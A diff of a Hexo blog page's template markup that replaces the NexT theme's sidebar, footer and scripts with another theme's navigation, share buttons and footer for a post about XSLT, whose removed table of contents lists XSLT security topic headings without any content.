-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/17/运算符的巧妙利用/" rel="next" title="运算符的巧妙利用">
-                <i class="fa fa-chevron-left"></i> 运算符的巧妙利用
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/11/23/Linux目录/" rel="prev" title="Linux目录">
-                Linux目录 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-  </div>
 
 
         </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            Overview
-          </li>
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/11/23/Linux目录/"
+                    data-tooltip="Linux目录"
+                    aria-label="上一篇: Linux目录"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/11/17/运算符的巧妙利用/"
+                    data-tooltip="运算符的巧妙利用"
+                    aria-label="下一篇: 运算符的巧妙利用"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
         </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
-          <p class="site-author-name" itemprop="name">John Doe</p>
-           
-              <p class="site-description motion-element" itemprop="description"></p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives/">
-                <span class="site-state-item-count">47</span>
-                <span class="site-state-item-name">posts</span>
-              </a>
-            </div>
-          
-
-          
-
-          
-
-        </nav>
-
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-
-        <div class="links-of-author motion-element">
-          
-        </div>
-
-        
-        
-
-        
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
             
-              
             
-
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/18/认识xslt/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XSLT"><span class="nav-number">1.</span> <span class="nav-text">什么是XSLT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#举个栗子"><span class="nav-number">1.1.</span> <span class="nav-text">举个栗子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进一步"><span class="nav-number">2.</span> <span class="nav-text">进一步</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全问题"><span class="nav-number">3.</span> <span class="nav-text">安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xxe"><span class="nav-number">3.1.</span> <span class="nav-text">xxe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xsl-include"><span class="nav-number">3.2.</span> <span class="nav-text">xsl:include</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#端口探测"><span class="nav-number">3.2.1.</span> <span class="nav-text">端口探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读文件"><span class="nav-number">3.2.2.</span> <span class="nav-text">读文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#document"><span class="nav-number">3.3.</span> <span class="nav-text">document</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#读文件-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#探测端口"><span class="nav-number">3.3.2.</span> <span class="nav-text">探测端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解析一句话"><span class="nav-number">3.4.</span> <span class="nav-text">解析一句话</span></a></li></ol></li></ol></div>
             
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/18/认识xslt/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/11/18/认识xslt/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
 
-          </div>
-        </section>
-      <!--/noindex-->
-      
 
-      
-
+        
+        
+            
+        
     </div>
-  </aside>
+</article>
 
 
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2020 John Doe. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/11/23/Linux目录/"
+                    data-tooltip="Linux目录"
+                    aria-label="上一篇: Linux目录"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/11/17/运算符的巧妙利用/"
+                    data-tooltip="运算符的巧妙利用"
+                    aria-label="下一篇: 运算符的巧妙利用"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/18/认识xslt/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/18/认识xslt/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/11/18/认识xslt/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
 </div>
 
 
-<div class="powered-by">
-  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
-</div>
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/18/认识xslt/"
+                        aria-label="分享到 Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/18/认识xslt/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/11/18/认识xslt/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
 
-<div class="theme-info">
-  Theme -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
-  </a>
-</div>
 
-
+            
+        </div>
         
 
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
         
-      </div>
-    </footer>
+            <h4 id="about-card-name">John Doe</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
+<!--SCRIPTS END-->
+
 
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
 
-  </div>
 
-  
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
 
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-</body>
+    </body>
 </html>
